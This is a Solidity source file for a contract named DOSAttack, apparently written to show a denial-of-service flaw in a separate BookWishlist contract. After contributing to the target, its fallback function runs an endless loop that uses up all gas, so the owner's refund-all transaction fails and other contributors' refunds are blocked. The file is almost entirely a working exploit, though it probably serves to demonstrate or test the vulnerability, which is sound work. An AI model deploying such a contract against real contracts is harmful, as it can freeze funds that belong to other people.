pragma solidity ^0.4.18;

import "./BookWishlist.sol";

/*
 * This contract is constructed to take advantage of a DOW
 * flaw built into BookWishlist. It stops the target owner
 * from refunding other contributors.
 */
contract DOSAttack {
    BookWishlist target;

    function DOSAttack(address _t) public {
        target = BookWishlist(_t);
    }

    // Sets up attack by contributing to target Wishlist.
    function setUpAttack() public payable {
        target.contribute.value(msg.value)(0);
    }

    /*
     * If the wishlist owner tries to refund all, this will consume
     * all gas, causing the transaction to fail.
     */
    function () public payable {
        uint i = 2;
        while(true) {
            i += i;
        }
    }
}
